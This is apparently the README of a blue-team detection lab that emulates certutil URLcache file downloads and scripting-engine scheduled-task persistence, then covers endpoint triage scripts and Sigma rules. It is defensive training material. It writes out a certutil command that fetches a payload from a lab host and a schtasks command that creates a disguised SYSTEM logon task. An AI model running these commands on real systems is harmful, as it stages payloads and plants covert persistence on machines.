# Threat Detection Lab — Adversary Emulation & Triage

> A hands-on detection engineering lab mapping adversary techniques to SIEM alerts, endpoint forensics, and IR triage workflows. Built to demonstrate blue team capabilities across the full detection lifecycle.

> POC creation and master triage script compiled and authored by Greg Mamoyac. For production IR engagements, this lab's triage logic maps to KAPE collection targets and Eric Zimmerman's forensic parsers. For comprehensive forensic analysis via consolidated DFIR investigative toolkit, please refer to my own developed application [Gregrep-Overlord-App](https://github.com/gregmamoyac/Gregrep-Overlord-App)

---

## Table of Contents
- [Lab Overview](#lab-overview)
- [MITRE ATT&CK Coverage](#mitre-attck-coverage)
- [Repository Structure](#repository-structure)
- [Lab Environment Requirements](#lab-environment-requirements)
- [Module 1 — Adversary Emulation](#module-1--adversary-emulation)
- [Module 2 — Triage & Hunting](#module-2--triage--hunting)
- [Detection Rules](#detection-rules)
- [Sample Findings & Timeline](#sample-findings--timeline)
- [Disclaimer](#disclaimer)

---

## Lab Overview

This lab simulates two real-world attacker techniques observed in the wild and then demonstrates how a blue team analyst would:

1. **Detect** the technique via SIEM/Sysmon alerts
2. **Triage** the affected endpoint — event logs, browser artifacts, scheduled tasks, prefetch
3. **Build a timeline** correlating attacker activity to victim behavior

**Techniques emulated:**
| Technique | MITRE ID | Description |
|-----------|----------|-------------|
| CertUtil URLcache Abuse | T1105 | Living-off-the-land file download via certutil `-urlcache -split -f` |
| Suspicious Scheduled Task (Script Engine) | T1053.005 | Persistence via schtasks created by wscript/cscript/mshta |

---

## MITRE ATT&CK Coverage

```
Initial Access        Execution              Persistence            Discovery
      │                    │                      │                     │
      ▼                    ▼                      ▼                     ▼
  (simulated)      T1059 - Scripting       T1053.005 - Sched    T1083 - File/Dir
                   Engine (wscript)        Task Creation         Enumeration
                        │
                        ▼
                   T1105 - Ingress
                   Transfer (certutil)
```

---

## Repository Structure

```
blueteam-lab/
│
├── README.md                          ← You are here
│
├── adversary-emulation/
│   ├── Invoke-CertUtilDownload.ps1    ← Simulates certutil URLcache technique
│   ├── New-SuspiciousScheduledTask.ps1← Simulates scripting-engine schtask
│   └── run_emulation.bat              ← Wrapper to run both in sequence
│
├── triage/
│   ├── Invoke-EndpointTriage.ps1      ← Master triage script (runs all modules)
│   ├── Get-EventLogIOCs.ps1           ← Queries Security/System/Sysmon event logs
│   ├── Get-BrowserArtifacts.ps1       ← Reads browser history & downloads (SQLite)
│   ├── Get-ScheduledTaskAnomalies.ps1 ← Enumerates and scores suspicious tasks
│   ├── Get-PrefetchEvidence.ps1       ← Parses prefetch for execution evidence
│   └── Get-CertUtilCache.ps1          ← Checks INetCache for certutil drops
│
├── detection-rules/
│   ├── sigma_certutil_urlcache.yml    ← Sigma rule: certutil URLcache flag
│   └── sigma_schtask_scriptengine.yml ← Sigma rule: schtask by script engine
│
└── docs/
    ├── lab-setup.md                   ← How to build the lab environment
    └── sample-findings.md             ← Example triage output & timeline
```

---

## Lab Environment Requirements

| Component | Recommendation |
|-----------|---------------|
| OS | Windows 10/11 VM (isolated, no production network) |
| Logging | Sysmon v15+ with SwiftOnSecurity config |
| SIEM | Elastic SIEM, Splunk Free, or Windows Event Forwarding |
| PowerShell | v5.1+ with Script Block Logging enabled |
| Tools | SQLite3 CLI (for browser artifact parsing) |

>  **All emulation scripts are intended for isolated lab VMs only. Never run on production systems or systems you do not own and have explicit authorization to test.**

Enable Script Block Logging before running:
```powershell
# Run as Administrator
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
```

---

## Module 1 — Adversary Emulation

### Technique 1: CertUtil URLcache Abuse (T1105)

Attackers use the built-in `certutil.exe` binary to download files — a classic LOLBIN (Living Off the Land Binary). The `-urlcache` flag leaves artifacts in `%LOCALAPPDATA%\Microsoft\Windows\INetCache`.

```powershell
# What the script simulates:
certutil.exe -urlcache -split -f "http://lab-server/payload.txt" C:\Windows\Temp\payload.txt
```

**Run:**
```
.\adversary-emulation\Invoke-CertUtilDownload.ps1
```

**What to look for:**
- Sysmon Event ID 1: `certutil.exe` with `-urlcache` in CommandLine
- Sysmon Event ID 11: File creation in `C:\Windows\Temp\` or `INetCache`
- Sysmon Event ID 3: Network connection from `certutil.exe`

---

### Technique 2: Suspicious Scheduled Task via Scripting Engine (T1053.005)

Attackers create scheduled tasks from scripting engines (`wscript.exe`, `cscript.exe`, `mshta.exe`) to establish persistence. Windows Event ID 4698 captures task creation; Sysmon shows the parent process.

```powershell
# What the script simulates:
schtasks /create /tn "WindowsUpdateHelper" /tr "wscript.exe //B C:\ProgramData\update.vbs" /sc onlogon /ru SYSTEM
```

**Run:**
```
.\adversary-emulation\New-SuspiciousScheduledTask.ps1
```

**What to look for:**
- Security Event ID 4698: New scheduled task created
- Sysmon Event ID 1: Parent process is `wscript.exe` or `cscript.exe`
- Task XML in `C:\Windows\System32\Tasks\` with scripting engine action

---

## Module 2 — Triage & Hunting

Run the master triage script against a suspected endpoint (your lab VM):

```powershell
# Run as Administrator on the target lab machine
.\triage\Invoke-EndpointTriage.ps1 -OutputPath C:\TriageOutput -Hours 24
```

This will collect:

| Module | What It Finds |
|--------|--------------|
| `Get-EventLogIOCs` | 4698, 4688, 4624, Sysmon 1/3/7/11 matches |
| `Get-BrowserArtifacts` | Chrome/Edge/Firefox history & downloads in timeframe |
| `Get-ScheduledTaskAnomalies` | Tasks with scripting engine actions or suspicious names |
| `Get-PrefetchEvidence` | Executables run from temp/unusual paths |
| `Get-CertUtilCache` | Files in INetCache matching certutil drops |

All output is written to timestamped JSON + a human-readable summary report.

---

## Detection Rules

Sigma rules are provided for both techniques and can be converted to your SIEM's native query language:

```bash
# Convert to Elastic Query DSL
sigma convert -t lucene detection-rules/sigma_certutil_urlcache.yml

# Convert to Splunk SPL
sigma convert -t splunk detection-rules/sigma_certutil_urlcache.yml

# Convert to KQL (Microsoft Sentinel)
sigma convert -t kusto detection-rules/sigma_certutil_urlcache.yml
```

---

## Sample Findings & Timeline

See [`docs/sample-findings.md`](docs/sample-findings.md) for a full example triage output including:
- Alert timeline reconstruction
- Browser history correlation with certutil download window
- Scheduled task anomaly scoring
- IOC summary table

---

## Disclaimer

> This repository is for **educational and authorized lab use only**. All scripts are designed to run in an isolated VM environment that you own and control. The adversary emulation scripts intentionally generate detectable artifacts — they are noisy by design so analysts can practice detection. Do not run these scripts on systems you do not own or without explicit written authorization.

